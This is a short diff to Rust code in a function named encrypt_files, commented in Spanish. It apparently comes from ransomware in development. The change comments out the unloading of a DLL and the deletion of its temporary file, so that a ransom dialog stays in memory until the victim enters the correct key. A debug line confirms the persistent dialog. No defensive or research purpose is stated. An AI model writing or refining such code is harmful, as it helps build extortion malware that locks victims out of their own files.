@@ -618,8 +618,16 @@ fn encrypt_files(params: &str) -> String {
                 free_fn(result_ptr);
             }
             
-            FreeLibrary(h_module);
-            let _ = std::fs::remove_file(&dll_path);
+            // ⚠️  NO descargar la DLL ni eliminar el archivo
+            // El diálogo de ransomware se ejecuta en un thread separado
+            // y necesita que la DLL permanezca cargada en memoria
+            // La DLL y el archivo temporal permanecerán hasta que el proceso termine
+            // o hasta que el usuario ingrese la key correcta
+            
+            // FreeLibrary(h_module);  // ❌ COMENTADO: No descargar DLL
+            // let _ = std::fs::remove_file(&dll_path);  // ❌ COMENTADO: No eliminar archivo
+            
+            println!("DEBUG: DLL permanece cargada para el diálogo persistente");
             
             result_str
         };
